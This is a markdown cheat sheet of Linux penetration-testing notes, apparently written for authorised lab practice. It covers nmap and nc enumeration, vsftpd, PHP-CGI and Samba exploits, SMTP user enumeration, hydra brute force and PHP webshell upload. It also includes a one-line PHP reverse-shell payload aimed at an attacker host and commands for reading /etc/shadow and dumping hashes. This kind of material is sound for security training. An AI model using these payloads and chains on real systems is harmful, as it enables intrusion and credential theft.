# Linux — Black-Box Penetration Testing (GitHub-ready Markdown)

> **Warning / rules:** Only test systems you are explicitly authorized to. These notes are for authorised security testing and learning in safe labs.

---

## Short summary

This section covers Linux-focused black-box techniques: port scanning, manual enumeration, common service flows (Telnet, FTP/vsftpd, SMTP/username enumeration, PHP webapps, Samba, MySQL/WAMP chains) and practical steps to pivot from an initial finding to a foothold.

---

## Port scanning & enumeration (practical)

### 1) Quick service scan → save results

```bash
# fast service/version scan (store plain text)
nmap -sV -p1-10000 <target-ip> -oN openport.txt
```

When `nmap` appends `?` to a service (e.g., `exec?`, `login?`) it means nmap is *uncertain* about the exact service — manual verification is required.

### 2) Manual banner grabbing & probing

Use `nc` to probe ports the scanner flagged:

```bash
nc -nv <target-ip> 512     # example service probe
nc -nv <target-ip> 513
nc -nv <target-ip> 514
```

Behavior examples you may see:

* `Connection reset by peer` — remote host actively closed the connection.
* `Broken pipe` — remote closed / unexpected termination.
* If you get a connection and a prompt (e.g., on port 1524), it might be a **bind shell** (sometimes yields a remote shell as root).

### 3) Quick reconnaissance commands on a compromised host (only in-scope)

```bash
cat /etc/*release
uname -r
cat /etc/passwd
cat /etc/shadow   # only if authorised and appropriate
```

---

## Targeting vsftpd (practical notes)

* Check anonymous FTP first:

  ```bash
  nmap --script ftp-anon -p21 <target-ip>
  ```
* If anonymous or credentials work, browse directories and look for upload points or webshell opportunities.
* Example Searchsploit flow:

  ```bash
  searchsploit vsftpd
  searchsploit -m 49757     # copy exploit locally
  ```

  Note: Some PoCs require specific conditions (e.g., a particular auxiliary port open — e.g., TCP 6200). If the required port/service is not present the exploit will fail — **not every exploit works on every host**.

### If anonymous or creds fail, use SMTP to enumerate users (useful on Linux)

* Many SMTP servers give hints about valid local user accounts (VRFY/EXPN or banner behavior).
* Metasploit auxiliary:

  ```text
  # in msfconsole
  use auxiliary/scanner/smtp/smtp_enum
  set RHOSTS <target-ip>
  set UNIX_ONLY true
  run
  ```
* Use discovered usernames as inputs to brute-force attacks (only where allowed):

  ```bash
  hydra -l <username> -P /path/to/passwords.txt ftp://<target-ip>
  ```

---

## Web upload & webshells (LAMP vs IIS differences)

* **Windows/IIS** → use `.asp`/`.aspx` webshells.
* **Linux/Apache (LAMP)** → use `.php` webshells.
* Uploading a webshell (example PHP Reverse Shell):

  1. Generate or edit a PHP reverse shell to set your `LHOST` and `LPORT`.
  2. Upload via FTP or any writable web directory.
  3. Start a listener:

     ```bash
     nc -nvlp 1234
     ```
  4. Trigger the webshell in the browser: `http://<target-ip>/path/payload.php` → get a shell.

> Tip: If an FTP upload only goes to certain directories, try to find any writable directory under the web root (e.g., `/var/www/html`).

---

## Targeting PHP (php-cgi / phpinfo & php-cgi bug PoC)

1. Check for `phpinfo()` pages to learn PHP configuration:

   * Create `phpinfo.php` with `<?php phpinfo(); ?>` and request it.
2. Search for PHP CGI exploits (example exploit id):

   ```bash
   searchsploit php cgi
   searchsploit -m 18836
   ```
3. Some PoCs let you inject a small *payload string* (pwn\_code). Example payload idea (one-line PHP reverse shell in some contexts):

   ```php
   $sock=fsockopen("<LHOST>",1234);exec("/bin/sh -i <&3 >&3 2>&3");
   ```

   * Add the pwn code where the PoC expects it.
   * Start your listener:

     ```bash
     nc -nvlp 1234
     ```
   * Execute the PoC; if it fails, try adjusting descriptor numbers (e.g., change `3` to `4`) and re-run.

---

## Targeting Samba (practical)

1. Enumerate Samba version (gives you the exact version to map to exploits):

   ```text
   # in msfconsole
   use auxiliary/scanner/smb/smb_version
   set RHOSTS <target-ip>
   run
   ```
2. Once you have a version (e.g., `samba 3.0.20`), search for known EXPs:

   ```bash
   searchsploit samba 3.0.20
   ```
3. Metasploit or local PoC:

   * Use the appropriate module or PoC and test in a lab first.
   * After successful exploitation you may get an interactive shell. Upgrade the session if possible:

     ```text
     # in msfconsole
     sessions -i <id>
     session -u <id>   # attempt upgrade
     ```
4. Post-ex actions:

   ```bash
   cat /etc/passwd
   cat /etc/shadow
   hashdump     # if using Meterpreter & authorised
   ```

---

## Example Linux chain (FTP → web upload → webshell → escalate)

1. `nmap -sV -p1-10000 <ip>` → find FTP and web service open.
2. Check FTP for anonymous or credential access. If you find creds, upload `payload.php` to a web-writable dir.
3. Start `nc -nvlp <port>` and trigger the payload in the browser to get a shell.
4. On the new shell:

   ```bash
   uname -a
   cat /etc/*release
   id
   ```
5. Look for local privilege escalation vectors:

   * Kernel version `uname -r` → check for local kernel exploits (e.g., Dirty Cow if appropriate).
   * SUID binaries, weak services, or credential files (`wp-config.php`, backup files with credentials).

---

## Practical troubleshooting tips

* If a web change (config) still shows forbidden/old content, restart the web server or clear caches. Example Windows:

  ```text
  # meterpreter shell
  shell
  net stop wampapache
  net start wampapache
  ```
* Always **download original config files** before editing; upload modified files only in a controlled, authorised manner.
* Use `file` to inspect binaries you uploaded/compiled and `strings` to check for useful text.

---

## Quick useful commands (copy/paste)

### nmap

```bash
nmap -sV -p1-10000 <ip> -oN openport.txt
nmap --script ftp-anon -p21 <ip>
```

### nc

```bash
nc -nv <ip> 1524             # probe potential bind shell
nc -nvlp 1234                # listener
```

### hydra

```bash
hydra -l <username> -P /path/passwords.txt ftp://<ip>
hydra -l vagrant -P /path/passwords.txt ssh://<ip>
```

### msfconsole (examples)

```text
# smtp enum
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <ip>
set UNIX_ONLY true
run

# smb version
use auxiliary/scanner/smb/smb_version
set RHOSTS <ip>
run
```

---

## Practical takeaways (your refined notes)

* Nmap’s `?` means manual verification is needed — don’t assume results are 100% accurate.
* Banner grabbing with `nc` is fast and often yields immediate insights (sometimes a bind shell).
* Use SMTP enumeration to discover possible local usernames for targeted brute-force (only when allowed).
* Webshell strategy depends on server type — `.php` for LAMP, `.asp/.aspx` for IIS.
* Some PoCs have preconditions (extra ports, specific versions). If a PoC fails, re-check environment and EDB notes.
* Chain small wins (FTP creds → upload webshell → interactive shell → local privilege escalation).
* Always test exploits in a lab first and document every step for reporting and reproducibility.

---
